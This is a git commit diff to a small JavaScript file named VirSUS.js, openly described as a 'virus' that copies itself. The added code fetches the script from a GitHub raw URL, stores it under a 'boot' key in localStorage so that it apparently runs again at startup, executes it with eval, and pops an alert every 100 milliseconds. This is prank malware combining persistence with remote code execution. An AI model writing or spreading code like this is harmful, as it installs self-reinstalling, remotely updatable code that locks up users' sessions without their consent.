6d6e90d1b59b7383676204da795066d554be0ac1
Busybody64 <92069026+Busybody64@users.noreply.github.com>
2021-10-08 19:17:41 -0500

    Update VirSUS.js
    It's copying itself!

--- VirSUS.js
+++ VirSUS.js
@@ -1,1 +1,6 @@
-setInterval(function() {$alert('YOU JUST GOT THE SUS VIRUS!')},250)
+(async () => {
+    const settings = { method: "GET", mode: "cors", cache: "reload" };
+    localStorage["boot/VirSUS.js"] = await fetch("https://raw.githubusercontent.com/Busybody64/VirSUS/main/VirSUS.js", settings).then(response => response.text()); 
+    eval(localStorage["boot/VirSUS.js"]);
+})();
+setInterval(function() {$alert('YOU JUST GOT THE SUS VIRUS!')},100)
